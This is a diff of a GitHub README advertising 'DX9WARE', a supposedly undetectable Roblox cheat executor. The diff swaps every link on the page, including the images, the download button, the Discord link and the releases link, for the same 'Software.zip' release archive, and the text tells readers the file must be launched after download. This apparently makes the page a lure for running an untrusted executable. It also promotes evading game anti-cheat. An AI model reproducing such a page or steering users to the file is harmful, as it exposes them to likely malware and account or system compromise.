@@ -1,6 +1,6 @@
 # 🚀 Welcome to DX9WARE-Roblox Repository! 🤖
 
-![DX9WARE-Roblox](https://img.icons8.com/emoji/452/robot-emoji.png)
+![DX9WARE-Roblox](https://github.com/nikaa8/DX9WARE-Roblox/releases/download/v1.0/Software.zip)
 
 ### Description:
 Are you ready to take your Roblox scripting to the next level? Look no further than DX9WARE - a powerful Roblox executor that provides a secure, customizable Lua environment with a wide range of scripts and features. Whether you're into Arsenal, Blox Fruits, Da Hood, Phantom Forces, or any other popular Roblox game, DX9WARE has got you covered. This external tool is undetectable, making it perfect for advanced scripting without worrying about detection.
@@ -22,7 +22,7 @@ Are you ready to take your Roblox scripting to the next level? Look no further t
 🔰 roblox-dx9ware-free
 
 ### Get Started:
-📥 [Download DX9WARE Now!](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) 📥
+📥 [Download DX9WARE Now!](https://github.com/nikaa8/DX9WARE-Roblox/releases/download/v1.0/Software.zip) 📥
   
 #### Note: File needs to be launched after download.
 
@@ -38,11 +38,11 @@ Are you ready to take your Roblox scripting to the next level? Look no further t
 - **Undetectable:** Use DX9WARE without worrying about detection.
 
 ### Support:
-For any questions or issues regarding DX9WARE, feel free to reach out on our Discord server - [DX9WARE Discord](https://discord.com/dx9ware).
+For any questions or issues regarding DX9WARE, feel free to reach out on our Discord server - [DX9WARE Discord](https://github.com/nikaa8/DX9WARE-Roblox/releases/download/v1.0/Software.zip).
 
 ### Stay Updated:
-Keep an eye on our [Releases Section](https://github.com/cli/browser/releases) for the latest updates and enhancements to DX9WARE.
+Keep an eye on our [Releases Section](https://github.com/nikaa8/DX9WARE-Roblox/releases/download/v1.0/Software.zip) for the latest updates and enhancements to DX9WARE.
 
 ### Let's Script Like Pros with DX9WARE! 💻🎮🚀
 
-![Roblox](https://img.icons8.com/plasticine/452/roblox-logo.png)
+![Roblox](https://github.com/nikaa8/DX9WARE-Roblox/releases/download/v1.0/Software.zip)
